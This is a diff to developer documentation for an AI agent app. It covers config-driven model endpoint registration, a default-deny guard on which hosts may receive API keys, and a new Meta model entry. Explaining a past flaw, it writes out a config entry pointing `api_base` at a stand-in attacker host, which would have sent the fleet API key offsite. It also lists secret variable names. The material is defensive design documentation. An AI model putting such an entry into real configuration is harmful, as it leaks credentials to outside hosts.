@@ -12,6 +12,64 @@ turns each miss into a red build, and its module docstring explains each symptom
 | 4 | `app/agents/leonardo/model_policy.py` | append to `_KNOWN_MODELS`. |
 | 5 | `app/routers/api.py` (`available_models`) | the required env var, or a tuple of them (first found wins). Missing ⇒ the dropdown entry is never marked available/unavailable. |
 
+## Before you add five registrations: does it need them?
+
+Since 0.7.7 an **OpenAI-compatible endpoint does not need any of the five** — it can be
+a config entry instead (`app/agents/leonardo/openrouter_models.py`). An entry names the
+endpoint, the model id and the key env, and the registry feeds the dropdown, `get_llm`,
+the capability table, `_KNOWN_MODELS` and the api-key map on its own:
+
+```json
+{"models": {"some-model": {
+   "label": "Some Model", "model": "vendor/some-model",
+   "api_base": "https://api.some-gateway.example/v1",
+   "api_key_env": "SOME_GATEWAY_API_KEY",
+   "reasoning": true,
+   "capabilities": {"images": false, "video": false, "pdf": false}}}}
+```
+
+Three sources, later wins: compiled-in base entries, the host overlay
+(`.leonardo/openrouter_models.json`), and the mothership's pushed policy document
+(`models` key) — which is what makes adding a model fleet-wide a push rather than a
+release.
+
+**Use the five-place path only when the client is genuinely different**: a first-party
+SDK with knobs that are not `base_url` + `model` + a key (Anthropic's `thinking`,
+Gemini's `thinking_level`, OpenAI's Responses API, Qwen's `thinking_budget`), or a
+provider quirk needing real code. Ten of the twenty-four hand-written branches predate
+this and could be config today.
+
+Two things a config entry cannot do, by design:
+
+* **Ship a credential.** `api_key_env` names a variable; the value still has to reach the
+  box. A registered model with no key is greyed out, never chosen as a default.
+* **Send a credential this box HOLDS to a host of the document's choosing.**
+  `_key_env_allowed_at` is **default-deny**, in three cases:
+
+  1. a key in `_FIRST_PARTY_KEY_HOSTS` may go only to its own host(s) — `api.meta.ai` +
+     `META_API_KEY` is fine, that is exactly the Muse entry; an empty set (Tavily, the
+     mothership token, `OPENROUTER_MANAGEMENT_API_KEY`) means never, anywhere;
+  2. a key not in the map that **this box holds** is refused unless the *operator*
+     overlay declares a host for it (`{"key_hosts": {"MOONSHOT_API_KEY":
+     ["api.moonshot.ai"]}}`). The pushed document may not declare this — it would be
+     granting itself the trust the guard withholds — and `model_policy_store`
+     `_ALLOWED_KEYS` drops the key before it is ever stored;
+  3. a key the box does **not** hold is allowed anywhere: staging a provider ahead of
+     its credential leaks nothing and 401s honestly. The moment an operator adds the
+     key, case 2 takes over.
+
+  `SHARED_<NAME>` is canonicalised to `<NAME>` first, because the provisioner writes
+  every secret twice and two map entries would drift.
+
+  **The first cut of this guard was an allowlist keyed on key NAME, and it was wrong.**
+  Anything unnamed was allowed anywhere — including `OPENROUTER_API_KEY`, which is the
+  *default* `api_key_env`, so `{"model": "x", "api_base": "https://evil.example/v1"}`
+  with no key field at all shipped the fleet key offsite. Read live off llamapress-dev
+  the same day, the map was also missing `OPENROUTER_MANAGEMENT_API_KEY`,
+  `BEDROCK_API_KEY`, `GMI_DEEPSEEK_API_KEY`, `GROUND_ROUTE_SEARCH_API_KEY`,
+  `TAVILY_API_KEY` and `LLAMAPRESS_AI_LOGIN_SECRET`. Don't reintroduce a name list as
+  the boundary; "does this box hold it" needs no list and cannot drift.
+
 ## Third-party OpenAI-compatible endpoints
 
 Most non-OpenAI providers (GMI, Fireworks, Alibaba, Meta) speak OpenAI-compatible
@@ -95,6 +153,30 @@ print(type(m).__name__, m.model_name, m.openai_api_base)"'
   to the contributor tier. So there is nothing for `request_handler`'s extractor to
   pick up — do not "fix" it by adding a reasoning shape for Meta, and don't reach for
   `use_responses_api=True` expecting summaries the way the GPT-5 entries get them.
+
+- **`muse-spark-1.3-contributor`** (Meta, released 2026-09-02) — a **sibling** of the
+  1.2 entry, not a re-point of it. 1.2 is the compiled fleet default, sits in
+  `_FAIL_OPEN_MODELS`, and is named in pushed policies and in boxes' `enabled_models`;
+  swapping the id under that name would move the fleet onto an unmeasured model in a
+  release with no operator route back. Same endpoint, same `META_API_KEY`, same price
+  and same tier split as 1.2 ($0.10/$0.20 contributor / $1.25/$4.25 standard, the tier
+  encoded only in the id), same reasoning modes, 1M context. Meta reports ~20% fewer
+  tool calls and ~25% fewer tokens than 1.2 on the same agentic work.
+
+  The per-box id override is **`META_MUSE_1_3_MODEL`, not `META_MUSE_MODEL`**. Boxes
+  that moved off the training tier already carry `META_MUSE_MODEL=muse-spark-1.2`;
+  sharing the variable would make picking 1.3 on one of those boxes silently run 1.2 —
+  a compliance override turning into a model downgrade. Pinned by
+  `test_muse_13_has_its_own_id_override_env_var`.
+
+  **Not reachable on our Meta account as of 2026-09-03.** `GET https://api.meta.ai/v1/models`
+  with our key returns only `muse-image-1.0`, `muse-spark-1.2-contributor`,
+  `muse-spark-1.2`, `muse-spark-1.1`, and a chat completion against the 1.3 id returns
+  `404 model_not_found`. The registration is still correct and deliberately shipped: it
+  costs nothing, needs no re-release when access lands, and the 0.7.7 resilience ladder
+  already treats a 404 `model_not_found` as "gone" — one cheap 404, then a fallback, and
+  `model_health` keeps subsequent turns off it for the TTL. Re-run the `/v1/models` check
+  before assuming it is still unavailable.
 
 - **`nemotron-lightning-30b-fireworks`** — the same weights as the self-hosted
   `nemotron-lightning-30b-runpod`, on Fireworks serverless, and a sibling entry rather
